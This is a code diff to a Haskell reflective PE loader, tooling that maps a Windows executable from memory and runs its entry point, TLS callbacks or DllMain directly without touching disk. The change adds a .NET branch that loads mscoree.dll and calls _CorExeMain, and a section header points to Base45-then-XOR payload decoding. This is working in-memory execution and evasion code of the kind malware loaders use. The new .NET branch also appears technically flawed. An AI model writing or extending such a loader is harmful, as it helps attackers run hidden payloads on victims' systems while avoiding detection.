@@ -49,6 +49,9 @@ foreign import ccall "windows.h GetCurrentProcess"
 foreign import ccall "windows.h GetLastError"
   c_GetLastError :: IO Word32
 
+foreign import ccall "mscoree.h _CorExeMain"
+  c_CorExeMain :: Ptr () -> IO Int32
+
 -- ============================================
 -- SAFETY LIMITS
 -- ============================================
@@ -88,6 +91,9 @@ iMAGE_DIRECTORY_ENTRY_BASERELOC = 5
 
 iMAGE_DIRECTORY_ENTRY_TLS :: Int
 iMAGE_DIRECTORY_ENTRY_TLS = 9
+
+iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR :: Int
+iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14
 
 dLL_PROCESS_ATTACH :: Word32
 dLL_PROCESS_ATTACH = 1
@@ -584,38 +590,68 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
   finalizeSections imageBasePtr ntHeadersInMem
   processTlsCallbacks imageBasePtr ntHeadersInMem
 
-  optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
-  let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
-      entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
-      subsystem = oh_subsystem optHeaderInMem
+  comDir <- getDataDirectory ntHeadersInMem iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
+  comDirData <- peek comDir
 
-  when (entryPointRVA == 0) $
-    error "Invalid entry point"
-
-  let entryAddrWord = ptrToWordPtr entryPointPtr
-      entryAddrInteger = fromIntegral entryAddrWord :: Integer
-
-  putStrLn $ "[*] Entry point RVA: 0x" ++ showHex (fromIntegral entryPointRVA :: Integer) ""
-  putStrLn $ "[*] Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
-  putStrLn $ "[*] Subsystem: " ++ show subsystem
-  hFlush stdout
-
-  putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
-  hFlush stdout
-
-  if subsystem == 2 || subsystem == 3
+  if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
     then do
-      let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
-      rc <- mkEntryPoint entryFunPtr
-      putStrLn $ "[*] Entry point returned: " ++ show rc
+      putStrLn "[*] Detected .NET assembly. Attempting to load CLR."
+      hFlush stdout
+
+      mscoreeName <- newCString "mscoree.dll"
+      mscoreeModule <- c_LoadLibraryA mscoreeName
+      free mscoreeName
+
+      when (mscoreeModule == nullPtr) $ do
+        err <- c_GetLastError
+        error $ "Failed to load mscoree.dll (error: " ++ show err ++ ")"
+
+      putStrLn "[*] mscoree.dll loaded. Calling _CorExeMain."
+      hFlush stdout
+
+      putStrLn "[*] Calling _CorExeMain..."
+      hFlush stdout
+      rc <- c_CorExeMain imageBase
+      putStrLn $ "[*] _CorExeMain returned: " ++ show rc
       hFlush stdout
       return ()
     else do
-      let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
-      rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
-      putStrLn $ "[*] DllMain returned: " ++ show rc
+      optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
+      let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
+          entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
+          subsystem = oh_subsystem optHeaderInMem
+
+      when (entryPointRVA == 0) $
+        error "Invalid entry point"
+
+      let entryAddrWord = ptrToWordPtr entryPointPtr
+          entryAddrInteger = fromIntegral entryAddrWord :: Integer
+
+      putStrLn $ "[*] Entry point RVA: 0x" ++ showHex (fromIntegral entryPointRVA :: Integer) ""
+      putStrLn $ "[*] Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
+      putStrLn $ "[*] Subsystem: " ++ show subsystem
       hFlush stdout
-      return ()
+
+      putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
+      hFlush stdout
+
+      if subsystem == 2 || subsystem == 3
+        then do
+          let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
+          putStrLn "[*] Calling mkEntryPoint..."
+          hFlush stdout
+          rc <- mkEntryPoint entryFunPtr
+          putStrLn $ "[*] Entry point returned: " ++ show rc
+          hFlush stdout
+          return ()
+        else do
+          let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
+          putStrLn "[*] Calling mkDllMain..."
+          hFlush stdout
+          rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
+          putStrLn $ "[*] DllMain returned: " ++ show rc
+          hFlush stdout
+          return ()
 
 -- ============================================
 -- DUAL DECODING: Base45 -> XOR
